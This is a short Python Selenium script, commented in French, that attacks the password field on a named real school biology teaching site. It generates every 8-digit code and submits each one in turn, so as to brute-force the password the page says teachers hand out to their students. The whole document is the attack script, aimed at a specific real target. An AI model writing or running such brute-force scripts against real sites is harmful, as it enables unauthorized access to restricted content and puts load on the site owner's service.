from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

# Configuration de Selenium et du navigateur (Chrome)
driver = webdriver.Chrome()  # Assurez-vous d'avoir installé ChromeDriver et que son chemin est configuré
driver.get("https://svt-erlich.fr/seconde/enseignement-obligatoire/theme-2-la-terre-la-vie-et-lorganisation-du-vivant/")

# Attendre que la page se charge
time.sleep(20)

# Générez tous les chiffres
def generer_tous_les_chiffres():
    chiffres = [str(i).zfill(8) for i in range(1, 100000000)]
    return chiffres

chiffres = generer_tous_les_chiffres()

# Ciblez l'élément input par son attribut placeholder
champ_saisie = driver.find_element_by_css_selector('input[placeholder="Mot de passe donné par votre enseignants value data dashlane-rid-case38758472"]')

# Boucle pour envoyer chaque chiffre à l'élément input
for chiffre in chiffres:
    # Copiez le chiffre dans le presse-papiers (en utilisant JavaScript)
    driver.execute_script(f"navigator.clipboard.writeText('{chiffre}')")

    # Collez le chiffre dans l'élément input
    champ_saisie.clear()  # Effacez le champ s'il contient déjà du texte
    champ_saisie.send_keys(Keys.CONTROL, 'v')

    # Appuyez sur Entrée
    champ_saisie.send_keys(Keys.ENTER)

    # Attendez un certain temps
    time.sleep(1)

# Fermez le navigateur
driver.quit()
